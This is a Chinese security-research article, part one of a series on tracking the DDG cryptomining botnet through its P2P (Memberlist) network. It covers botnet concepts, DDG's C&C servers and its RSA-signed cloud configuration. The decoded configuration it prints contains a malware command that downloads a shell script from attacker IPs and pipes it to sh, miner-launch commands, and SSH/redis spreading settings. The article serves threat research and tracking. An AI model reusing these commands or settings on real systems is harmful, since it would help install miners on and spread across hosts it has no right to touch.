> 原文链接: https://www.anquanke.com//post/id/177665 


# 以P2P的方式追踪 DDG 僵尸网络（上）


                                阅读量   
                                **294638**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p1.ssl.qhimg.com/t01ac95d3f7c3325533.jpg)](https://p1.ssl.qhimg.com/t01ac95d3f7c3325533.jpg)

> 本系列文章从 Botnet(僵尸网络)的基础概念说起，围绕实现了 P2P 特性的 DDG.Mining.Botnet，一步一步设计一个基于 P2P 的僵尸网络追踪程序，来追踪 DDG。内容分 **上**、**下** 两部分：<br>**上** 半部分写本人理解的 Botnet 相关概念，然后介绍 DDG Botnet，着重介绍其涉及的 P2P 特性；<br>**下** 半部分写如何根据 DDG.Mining.Botnet 的 P2P 特性，来设计一个僵尸网络跟踪程序 DDG.P2P.Tracker，用以遍历 Botnet 中的节点、及时获取最新的云端配置文件、及时下载到 Botnet 中最新的恶意样本、及时获知 Botnet 中最新启用的 C&amp;C 服务器。

## 1. 概述

### <a class="reference-link" name="1.1%20Botnet%20%E5%8F%8A%E5%85%B6%E7%BD%91%E7%BB%9C%E7%BB%93%E6%9E%84"></a>1.1 Botnet 及其网络结构

#### <a class="reference-link" name="1.1.1%20Botnet%20%E7%AE%80%E4%BB%8B"></a>1.1.1 Botnet 简介

**Botnet(僵尸网络)**没有一个准确的定义，关于什么是 Botnet，众说纷纭，总结起来不外乎两大特性：
1. 众多被入侵的僵尸主机，上面运行着相同的 Botnet 客户端恶意程序，这些众多的僵尸主机组成一个大型的“网络”(顾名思义被称作**僵尸网络**)，可以进行统一的恶意活动——**主要特性**；
1. 僵尸网络实施的统一的恶意活动，由 C&amp;C(Command and Control)服务来控制，一般说来，是可以长时间持续控制——**次要特性**。
Botnet 常见的恶意活动有实施 DDoS 攻击、用来做 Proxy Server 或者发送垃圾邮件等等。一个典型 DDoS Botnet 的大致结构如下图所示：

[![](https://p1.ssl.qhimg.com/t0185044faeeddc1ced.png)](https://p1.ssl.qhimg.com/t0185044faeeddc1ced.png)

#### <a class="reference-link" name="1.1.2%20%E4%BC%A0%E7%BB%9F%20Botnet"></a>1.1.2 传统 Botnet

传统的 Botnet，一般指**可以通过少数特定C&amp;C服务器来集中式控制的僵尸网络**，用来给僵尸主机上的 Botnet 客户端恶意程序下发指令的服务器，叫做 **C&amp;C 服务器**(Command and Control Server)。其网络模型基于 Client-Server 模型，属于**中心化控制(Centralized Control)**方式。其概要结构图如下(中间的图标代表 C&amp;C 服务器)：

[![](https://p1.ssl.qhimg.com/t018fa2839e6b09e963.png)](https://p1.ssl.qhimg.com/t018fa2839e6b09e963.png)

这种网络结构只有一个或者少数几个 C&amp;C 服务器，一旦 C&amp;C 服务器被封堵、屏蔽，整个 Botnet 就轰然倒塌，脆弱性是显而易见的。所以，这种网络结构的 Botnet 发展历程中，从样本层面到网络设施层面都衍生了错综复杂的对抗措施，二进制样本层面的对抗之外，从 DGA 到 Fast-Flux，到借助于公共网络服务的 C&amp;C 通道，再到近两年基于区块链的域名解析，最终目的都是提高这种 Botnet 背后 C&amp;C 服务的健壮性，以降低被轻易摧毁的可能性。

#### <a class="reference-link" name="1.1.3%20P2P%20Botnet"></a>1.1.3 P2P Botnet

为了避免传统 Botnet 中的 **单点故障** 现象，也不想使用太复杂的技术来提高个别 C&amp;C 服务的健壮性，去中心化的 P2P Botnet 应运而生。基于 P2P 协议实现的 Botnet，不再需要中心化的 C&amp;C 服务器，只靠 Bot 节点之间各自通信，传播指令或者恶意文件。而 Botnet 的控制者(BotMaster)就隐藏在大批量的 Bot 节点中，悄悄控制着整个 Botnet。

这样以来至少有两个显而易见的好处：一方面消除了传统 Botnet 中的中心化控制带来的单点故障因素，另一方面还让 BotMaster 更加隐蔽。

关于 P2P Botnet，有 3 个方面要阐述清楚，才能更好地理解这种 Botnet。

**一**是所使用的 **P2P 协议**。P2P 协议有很多种，并且不止一种 P2P 协议可以用来组建 P2P Botnet。目前最常见的 P2P 协议莫过于基于 [DHT](https://en.wikipedia.org/wiki/Distributed_hash_table) 实现的 P2P 协议，用来构建 P2P 文件共享网络的 BitTorrent 协议，也是基于 DHT 协议实现。

**二**是 Botnet 的**控制方式**。前面说过 P2P Botnet 中，BotMaster 控制着其中一个 Bot 节点（后文简称 **SBot** ），隐藏在大批量的 Bot 节点中，通过 SBot 节点，向整个 Botnet 发出控制指令或者更新恶意文件。根据 P2P 协议特性，理论上任何人都可以加入这个网络并与其他节点通信。整个过程中，BotMaster 必须保证只有他自己可以发送有效的控制指令或文件，其他节点可以进行常规通信(遍历节点、查询临近节点信息、接收指令或文件等等)，但不能发送控制指令或文件。其他节点发出的指令或文件，整个网络中的 Bot 节点都不会接受。

要实现这样的特性，BotMaster 必须给这些关键通信加上校验机制。比如利用非对称加密算法，通过只有 BotMaster 一人掌握的密钥给通信内容加上数字签名。接收到指令或文件的 Bot 节点，会用自己的另一个密钥来校验数据的合法性，合法的通信才接受，非法的则丢弃。

**三**是 P2P Botnet 的**网络结构**。P2P Botnet 的结构，就是典型的 P2P 网络结构，如图所示：

[![](https://p2.ssl.qhimg.com/t01aab43074eb4657ea.png)](https://p2.ssl.qhimg.com/t01aab43074eb4657ea.png)

这其实是一个简化的网络模型，考虑到 NAT 的存在，这种模型图并不能精准描述 P2P Botnet 的网络结构。对此， [Peer-to-Peer Botnets for Beginners](https://www.malwaretech.com/2013/12/peer-to-peer-botnets-for-beginners.html) 中有详细描述，他给出的 P2P Botnet 网络结构图如下：

[![](https://p2.ssl.qhimg.com/t017bfce7493c4e15ca.png)](https://p2.ssl.qhimg.com/t017bfce7493c4e15ca.png)

#### <a class="reference-link" name="1.1.4%20%E6%8C%96%E7%9F%BF%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C"></a>1.1.4 挖矿僵尸网络

文章开头说了 Botnet 的两大特性，第二条算是**次要特性**，这样说的理由，配合挖矿僵尸网络(Mining Botnet)来解释更容易理解。

一般说来，无论是传统 Botnet 还是 P2P Botnet，都有一个 C&amp;C 服务来持续控制它，比如控制它今天 DDoS 一个网站，明天给某个帖子刷量，后天又去发一波垃圾邮件……但近些年来，随着挖矿僵尸网络的盛行，由于盈利模式的简单粗暴，致使 Botnet 的网络结构也发生了细微的变化：**挖矿僵尸网络可以不再需要一个持续控制的 C&amp;C 服务**。

对于**纯粹的**挖矿僵尸网络，它的恶意活动是单一而且确定的：**挖矿**，所以可以不再需要一个 C&amp;C 服务来给它下发指令来实施恶意活动；它的恶意活动是持续进行的，不间断也不用切换任务，所以也不需要一个 C&amp;C 服务来**持续控制**。挖矿僵尸网络要做的事情，从在受害主机上植入恶意矿机程序开始，就可以放任不管了。甚至 BotMaster 都不需要做一个 Report 服务来统计都有哪些僵尸节点来给自己挖矿，自己只需要不断地**入侵主机—&gt;植入矿机—&gt;启动矿机程序挖矿**，然后坐等收益即可。

这只是比较简单粗暴的情况，即使没有一个持续控制的 C&amp;C 服务，我们也把它叫做 Botnet——Mining.Botnet。不过为了谨慎起见，窃以为还要加上一个特性：恶意程序的**蠕虫特性**。如果一个攻击者，它的相关恶意程序没有蠕虫特性，只是自己通过批量扫描+漏洞利用批量拿肉鸡，然后往肉鸡上批量植入恶意矿机程序来盈利，我们并不认为它植入的这些矿机程序组成了一个 Botnet。一旦有了蠕虫特性，恶意程序会自己主动传播，一步步构建成一个统一的**网络**，然后统一挖矿来为黑客牟利，我们才会把它叫做 Mining.Botnet(之所以有这个认识，可能是因为目前曝光的绝大多数稍具规模或者危害稍大的挖矿僵尸网络，其中恶意样本或多或少都有蠕虫特性)。

这样，纯粹的 Mining.Botnet 可以只满足文章开头提到的第一个特性，只要自身恶意程序有蠕虫特性，我们还是可以把它称为 Botnet。

当然，这只是为了说明 Botnet 网络架构微小变化而举的简单粗暴的例子。现实中遇到的 Mining.Botnet ，大多要更复杂一些。一般至少会有一个服务器提供恶意样本的下载，有的会提供一个云端的配置文件来控制矿机工作，有的会自建矿池代理服务，有的会在入侵、传播阶段设置更加复杂的服务端控制，还有的在持久驻留失陷主机方面做复杂的对抗……需要注意的是，这些真实存在的 Mining.Botnet 中，这些恶意服务器提供的多是下载、代理服务，而不一定具有传统 Botnet C&amp;C 服务那样**下发控制指令**的功能。

### <a class="reference-link" name="1.2%20%E5%AF%B9%20Botnet%20%E7%9A%84%E5%A4%84%E7%BD%AE%E6%8E%AA%E6%96%BD"></a>1.2 对 Botnet 的处置措施

对于 Botnet，安全研究人员 OR 安全厂商可以采取的措施，大致有以下几种：
1. 分析透彻 Botnet 样本工作原理、攻击链条、控制方式、通信协议以及网络基础设施，评估该 Botnet 可能造成的危害；梳理中招后的清除方案，提取相关 IoC 并公开给安全社区。安全厂商在安全产品中实现基于样本特征、通信协议或者 IoC 的防御措施，保护用户的安全。这样可以削弱整个 Botnet；
1. 联合 ISP 和执法机构，封堵 Botnet 背后的网络基础设施，对域名采取 Sinkhole 措施或者直接禁止解析，阻断 IP 访问甚至控制 C&amp;C 服务器的主机。如果 Botnet 的网络基础设施比较脆弱，比如只有这么一个 C&amp;C 服务器，这样会直接端掉(Take Down)整个 Botnet；
1. 根据对 Botnet 的协议特征、攻击方式等方面的分析，或者根据对其 C&amp;C 域名的 Sinkhole 数据，度量 Botnet 的规模，统计 Bot 节点的信息，联合有关方面清除 Bot 节点上的 Bot 程序。这样也会削弱整个 Botnet；
1. 通过对 Botnet 的跟踪（监控云端配置文件、解析 C&amp;C 服务器的最新指令或者 P2P 追踪等等），监控 Botnet 的最新动向，方便采取一定防御措施；
1. 对于有缺陷的 P2P Botnet，通过向 Botnet 投毒的方式清除整个 Botnet。
简单总结起来，就是**能干掉的就干掉，干不掉的就想办法将它削弱**。



## 2. DDG.Mining.Botnet

DDG.Mining.Botnet(下文称 **ddg**) 是一个挖矿僵尸网络。ddg 最初的结构比较简单：
<li>
**具有蠕虫功能的恶意程序**(下文简称 **主样本**)可以利用漏洞来入侵主机实现自主传播；</li>
- 有 1~3 个**文件下载服务器**提供矿机程序和恶意 Shell 脚本的下载，Shell 脚本被具有蠕虫功能的恶意程序下载到失陷主机中用来做定时任务，实现常驻失陷主机；恶意矿机程序则被 Shell 脚本不断下载、启动来挖矿。
360Netlab 对 ddg 进行了长期跟踪，对它的几个主要版本进行详细分析并发布 [系列技术报告](https://blog.netlab.360.com/tag/ddg/)。现在，ddg 已经集成了 P2P 机制，实现了 Bot 节点间的互联互通，构建成了一个**非典型** P2P Botnet(下文会解释为什么称它**非典型**)。

不过我们没能把 ddg 干掉，只做到了**追踪**(因为它内部有基于 RSA 数字签名的校验机制，无法向僵尸网络投毒；也没能 Take Down 它的 C&amp;C Server)，这也是本文的主题。目前我们可以做到以下四点：
- 及时获取当前 ddg 中的 Bot 节点信息；
- 及时获取它最新的云端配置数据；
- 即使获取它释放出来的最新恶意样本；
- 及时获知它最新启用的 C&amp;C Server。
接下来就从 ddg 的核心特性说起，参考这些核心特性一步一步设计一个 P2P Botnet Tracker。

### <a class="reference-link" name="2.1%20ddg%20%E7%9A%84%E7%BD%91%E7%BB%9C%E7%BB%93%E6%9E%84"></a>2.1 ddg 的网络结构

相比最初的结构，ddg 当前版本有两个新特性：
- 1~3 个文件下载服务器同时提供云端配置数据，ddg 的主样本会通过向 `http://&lt;c&amp;c_server&gt;/slave` 发送 Post 请求来获取配置数据；
- 僵尸网络内启用了P2P通信机制：集成了分布式节点控制框架 [Memberlist](https://github.com/hashicorp/memberlist)，该框架实现了扩展版的**弱一致性分布式控制协议 [SWIM](http://www.cs.cornell.edu/projects/Quicksilver/public_pdfs/SWIM.pdf)** (扩展版的协议称为 **[Lifeguard](https://arxiv.org/pdf/1707.00788.pdf%5D)** )，并以此实现了 P2P 机制，用来管理自己的 Peers(Bots)。
综合一下，当前集成了 P2P 机制的 ddg，网络结构概要图大致如下：

[![](https://p4.ssl.qhimg.com/t01e7166b9e6966b203.png)](https://p4.ssl.qhimg.com/t01e7166b9e6966b203.png)

上图黄色虚线聚焦的图标，代表 ddg 的恶意服务器，提供主样本程序、恶意 Shell 脚本和矿机程序的下载，还提供云端配置数据的下发服务。这里就可以解释前文中说 ddg 当前版本是**非典型** P2P Botnet 的理由了：
<li>
**网络结构**：典型的 P2P Botnet 网络结构，至少不会有中间一个**中心化**的文件和配置数据服务器，加上这么一个中心化的恶意服务器，显得 P2P 的网络结构不是那么“纯粹”。一个比较纯粹的 P2P Botnet ，网络结构可以参考名噪一时的 P2P Botnet **[Hajime](https://blog.netlab.360.com/hajime-status-report/)**，去除中间那个中心化的恶意服务器，所有指令、文件和配置数据的下发与传播，都靠 P2P 协议来实现，在 Bot 节点之间互相传递。而 ddg 这种网络结构，也使得它构建的 P2P 网络承载的功能比较鸡肋：只用来做 Bot 节点间的常规通信，不能承载 Botnet 的关键恶意活动；</li>
<li>
**网络协议**：构建 P2P 网络，无论是常见的 BT 文件共享网络还是恶意的 Botnet，比较多的还是基于 [DHT](https://en.wikipedia.org/wiki/Distributed_hash_table) 协议来实现。Hajime 和同样是 Go 语言编写的 P2P Botnet **[Rex](https://vms.drweb.com/virus/?_is=1&amp;i=8436299)** ，用来构建 P2P 网络的协议都是 DHT。而 ddg 构建 P2P 网络的框架则是本来在分布式系统领域用来做集群成员控制的 Memberlist 框架，该框架用基于 Gossip 的弱一致性分布式控制协议来实现。如果不太明白这个框架常规的应用场景，那么把它跟 [Apache ZooKeeper](https://en.wikipedia.org/wiki/Apache_ZooKeeper) 来对比一下或许更容易理解：它们都可用于分布式节点的服务发现，只不过 ZooKeeper 是强一致性的，而 Memberlist 是弱一致性(参考： [基于流言协议的服务发现存储仓库设计](https://www.jianshu.com/p/5e7e78788d12))。</li>
基于以上两点，足够说明 ddg 是一个 **非典型** P2P Botnet。

### <a class="reference-link" name="2.2%20ddg%20%E7%9A%84%20C&amp;C%20%E6%9C%8D%E5%8A%A1%E5%99%A8"></a>2.2 ddg 的 C&amp;C 服务器

ddg 的服务器自从提供了云端配置数据的下发，便具备了传统僵尸网络中的 Command and Control 功能，所以可以名正言顺地称之为 C&amp;C 服务器。

ddg 的服务器地址，在是内置在主样本中的。在主样本中有一个 **HUB IP List** 的结构，里面有上百个 IP 地址的列表，这份列表中，绝大部分是失陷主机的 WAN_IP 地址，只有1~3 个是当前存活的 C&amp;C 地址(1 个 **主 C&amp;C 服务器**，2 个**备用 C&amp;C 服务器**)。主样本执行期间会遍历这份 IP 列表，找到可用的 C&amp;C 服务器地址，通过向 `http://&lt;c&amp;c_server&gt;/slave` 发送 Post 请求来获取配置数据。

云端配置数据是用 [msgPack](https://msgpack.org) 编码过的，解码后的配置数据中有最新的恶意 Shell 脚本下载地址，这个下载地址中的 IP 即为最新的 **主 C&amp;C 服务器**。

恶意的 Shell 脚本中会给出最新的主样本下载地址，这个下载地址中的 IP 也是最新的**主 C&amp;C 服务器**，目前来看，恶意 Shell 脚本中的 C&amp;C 地址与云端配置数据中提供的 C&amp;C 地址都是一致的。

这样一来，共有 3 中方式能获取到最新的 C&amp;C 服务器地址：
1. 解析 HUB IP List，通过遍历其中的 IP 列表来发现 C&amp;C 服务器地址；
1. 解析恶意 Shell 脚本，提取其中的 C&amp;C服务器地址；
1. 解析配置文件，提取其中的 C&amp;C 服务器地址。
### <a class="reference-link" name="2.3%20ddg%20%E7%9A%84%E4%BA%91%E7%AB%AF%E9%85%8D%E7%BD%AE%E6%95%B0%E6%8D%AE"></a>2.3 ddg 的云端配置数据

前文提到过，ddg 的云端配置数据，是经过 msgPack 编码的，配置数据解码后的内容如下：

```
`{`
    'Data':`{`
        'CfgVer': 6,
        'Cmd': `{`
            'AAredis': `{`
                'Duration': '240h',
                'GenAAA': False,
                'GenLan': True,
                'IPDuration': '6h',
                'Id': 6062,
                'Ports': [6379, 6389, 7379],
                'ShellUrl': 'hxxp://104.248.181.42:8000/i.sh',
                'Timeout': '1m',
                'Version': 3017
            `}`,
            'AAssh': `{`
                'Duration': '240h',
                'GenAAA': False,
                'GenLan': True,
                'IPDuration': '12h',
                'Id': 2057,
                'NThreads': 100,
                'Ports': [22, 2222, 12222, 52222, 1987],
                'ShellUrl': 'hxxp://104.248.181.42:8000/i.sh',
                'Timeout': '1m',
                'Version': 3017
            `}`,
            'Killer': [`{`
                    'Expr': '(/tmp/ddgs.3011|/tmp/ddgs.3012|/tmp/ddgs.3013|/tmp/ddgs.3014|/tmp/ddgs.3015|   /tmp/ddgs.3016|/tmp/ddgs.3017|/tmp/ddgs.3019)',
                    'Id': 475,
                    'Timeout': '60s',
                    'Version': 3017
                `}`,
                `{`
                    'Expr': '.+(cryptonight|stratum+tcp://|dwarfpool.com|supportxmr.com).+',
                    'Id': 483,
                    'Timeout': '60s',
                    'Version': -1
                `}`,
                `{`
                    'Expr': './xmr-stak|./.syslog|/bin/wipefs|./xmrig|/tmp/wnTKYg|/tmp/2t3ik',
                    'Id': 484,
                    'Timeout': '60s',
                    'Version': -1
                `}`,
                `{`
                    'Expr': '/tmp/qW3xT.+',
                    'Id': 481,
                    'Timeout': '60s',
                    'Version': 3017
                `}`
            ],
            'LKProc': [`{`
                'Expr': '/tmp/qW3xT.5',
                'Id': 488,
                'Timeout': '60s',
                'Version': 3020
            `}`],
            'Sh': [`{`
                    'Id': 479,
                    'Line': '(curl -fsSL hxxp://104.248.181.42:8000/i.sh||wget -q -O-  hxxp://132.148.241.138:8000/i.sh) | sh',
                    'Timeout': '120s',
                    'Version': -1
                `}`,
                `{`
                    'Id': 486,
                    'Line': 'chattr -i /tmp/qW3xT.5; chmod +x /tmp/qW3xT.5',
                    'Timeout': '20s',
                    'Version': 3017
                `}`
            ]
        `}`,
        'Config': `{`
            'Interval': '60s'
        `}`,
        'Miner': [`{`
            'Exe': '/tmp/qW3xT.5',
            'Md5': 'fb6bf5af8771b0dc446861484335fc5e',
            'Url': '/static/qW3xT.5'
        `}`]
    `}`,
    'Signature': [0x3b,0xd9,0x73,0x04,0x6d,0x75,0x68,0xe8,0xdd,0xd6,0x0c,0x5e,0xac,0xd1,0x29,0x2d,0x16,0x31,0x03,0xf4,0xfb,0xbb,0xa8,0x7d,0xba,0x6a,0xc8,0xda,0x6f,0xec,0x42,0x16,0x6a,0x00,0x8b,0x62,0x3f,0xa1,0x11,0x9b,0x16,0xe8,0xf2,0x13,0xb1,0x45,0x40,0xc5,0xd4,0xc6,0xaa,0x90,0x99,0x98,0x4b,0xc9,0x70,0x66,0x77,0x18,0xa9,0x82,0x53,0xb9,0x4f,0x10,0x05,0xdf,0x8d,0x6c,0x3a,0x31,0x2b,0x45,0x6f,0x9d,0xcb,0xd2,0x7d,0x5e,0x90,0x5f,0xb9,0x59,0x9e,0xa2,0x40,0x02,0x1b,0xe9,0xed,0xd5,0x57,0xb5,0x09,0x41,0x1e,0xd8,0x41,0xd8,0x0b,0xa8,0xd1,0x54,0x00,0xab,0x43,0xdc,0x70,0xce,0xca,0x14,0xc5,0x19,0xc9,0x37,0x0f,0x19,0xe0,0x02,0x95,0x30,0x57,0xa6,0xbb,0xc4,0xa6,0x85,0x51,0xcc,0x9b,0x0d,0xc4,0xc5,0x7d,0xb9,0xc4,0xa0,0x93,0x00,0xec,0x52,0x06,0x77,0xfe,0x82,0x52,0x1e,0x88,0xf2,0xe2,0xc6,0x21,0x3e,0x81,0x7e,0x1e,0x53,0x9d,0xb0,0xab,0xd4,0xc2,0xa3,0x85,0x8b,0xef,0xac,0xdd,0x9d,0x4b,0x5a,0x13,0x8e,0xa1,0x31,0x6d,0xc5,0xb2,0xf4,0xca,0x54,0x85,0x29,0xa0,0x62,0x0d,0xac,0xde,0xfa,0x86,0x09,0x2b,0x1c,0x05,0x5f,0xa0,0xa4,0x91,0x11,0xb0,0x6d,0x7e,0x1c,0xab,0x31,0x6f,0xca,0x64,0x15,0x44,0xe5,0xaf,0x24,0x12,0xb6,0x74,0xde,0x9c,0xc1,0xf7,0x0c,0x22,0x80,0x1f,0x07,0x2b,0x57,0xe2,0xfb,0xf9,0x39,0x0b,0x1b,0x4f,0xa3,0x82,0x07,0xce,0x35,0x41,0x23,0x73,0x94,0x8c,0x27,0x1b,0x77,0x1f,0x5e,0xdd,0xb5,0xb1,0xa6,0xa1,0x6c]
`}`
```

注意配置数据最后一项： **Signature** ，这其实是木马作者拿自己的 RSA 私钥对配置数据中的 **Data** 部分（真正用到的配置）生成的一个 RSA 签名字段。样本在解码配置数据之后，会用样本中内置的 RSA 公钥对 **Data** 部分配置数据进行校验，校验通过之后才会采用这些配置。样本中内置的 RSA 公钥如下：

```
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA1+/izrOGcigBPC+oXnr2  
S3JI76iXxqn7e9ONAmNS+m5nLQx2g0GW44TFtMHhDp1lPdUIui1b1odu36i7Cf0g  
31vdYi1i6nGfXiI7UkHMsLVkGkxEknNL1c1vv0qE1b2i2o4TlcXHKHWOPu4xrpYY  
m3Fqjni0n5+cQ8IIcVyjkX7ON0U1n8pQKRWOvrsPhO6tvJnLckK0P1ycGOcgNiBm  
sdA5WDjw3sg4xWCQ9EEpMeB0H1UF/nv7AZQ0etncMxhiWoBxamuPWY/KS3wZStUd  
gsMBOAOOpnbxL9N+II7uquQQkMmO6HriXRmjw14OmSBEoEcFMWF2j/0HPVasOcx2  
xQIDAQAB  
-----END PUBLIC KEY-----
```

由此可见，这份配置数据无法伪造。这样一来，我们就只能加入 DDG 的 P2P 网络进行节点探测，而无法对整个 P2P 网络进行投毒。

### <a class="reference-link" name="2.4%20ddg%20%E7%9A%84%20P2P%20%E8%8A%82%E7%82%B9"></a>2.4 ddg 的 P2P 节点

ddg 的主样本通过 Memberlist 框架成功加入了 P2P 网络之后，就会调用 `memberlist.Members()` 函数来获取当前 P2P 网络中的 Peers 列表。在 ddg 最近的几个版本中，主样本会把这份 Peers 列表保存到受害主机本地 `~/.ddg/&lt;VERSION_NUMBER&gt;.bs` 文件中。最新的版本则不会保存到本地，而是用开源的内嵌 KV 存储引擎 [Bolt](https://github.com/boltdb/bolt) 取代了之前的 `~/.ddg/&lt;VERSION_NUMBER&gt;.bs` 文件。即，样本获取到的 Peers 列表不再明文存储到本地文件中，而是存放到了内嵌的一个小型数据库中。

我们要获取 ddg 的 Peers 节点，就可以直接通过调用 `memberlist.Members()` 函数来获取。
